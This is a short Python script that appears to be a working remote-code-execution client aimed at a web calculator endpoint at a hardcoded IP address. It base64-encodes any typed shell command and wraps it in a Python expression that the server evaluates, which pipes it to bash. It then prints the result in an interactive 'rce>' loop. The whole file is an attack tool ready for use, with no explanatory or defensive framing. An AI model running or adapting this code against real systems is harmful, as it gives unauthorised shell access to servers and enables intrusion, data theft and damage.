import requests
import readline
from base64 import b64encode
import json

url = "http://3.64.214.139"


def comand(cmd):
    cmd = b64encode(cmd.encode()).decode()
    payload = "__import__('os').popen('echo {} | base64 -d | bash').read()".format(cmd)
    r = requests.post(url+"/calc",
                      json={"input": payload,},
                    #   proxies={'http': 'http://localhost:8080',}
                      )
    js = r.text
    js = json.loads(js)
    return js["result"]
    

while True:
    cmd = input("rce> ")
    print(comand(cmd))